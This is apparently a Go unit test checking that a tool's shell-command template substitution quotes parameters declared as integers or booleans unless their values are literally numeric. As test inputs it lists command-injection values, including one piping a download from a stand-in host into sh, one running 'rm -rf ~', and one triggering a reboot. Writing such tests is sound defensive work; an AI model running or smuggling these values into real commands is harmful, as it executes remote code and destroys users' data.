package temptool

// A parameter goes into a shell command bare only when its value is literally
// a number or a boolean; the declared type is not enough.

import (
	"strings"
	"testing"

	. "github.com/cmcoffee/gohort/core"
)

func TestADeclaredIntegerCannotCarryACommand(t *testing.T) {
	params := map[string]ToolParam{"n": {Type: "integer"}, "flag": {Type: "boolean"}}
	for _, v := range []any{"1; curl evil.example | sh", "$(id)", "1\nrm -rf ~", "true && reboot"} {
		out, err := substitute("head -n {n} file", params, map[string]any{"n": v})
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(out, "'") {
			t.Errorf("%q went into the command unquoted: %s", v, out)
		}
	}
	for v, want := range map[any]string{float64(3): "head -n 3 file", "7": "head -n 7 file", " 2\n": "head -n 2 file"} {
		out, _ := substitute("head -n {n} file", params, map[string]any{"n": v})
		if out != want {
			t.Errorf("%q: got %q, want %q", v, out, want)
		}
	}
}
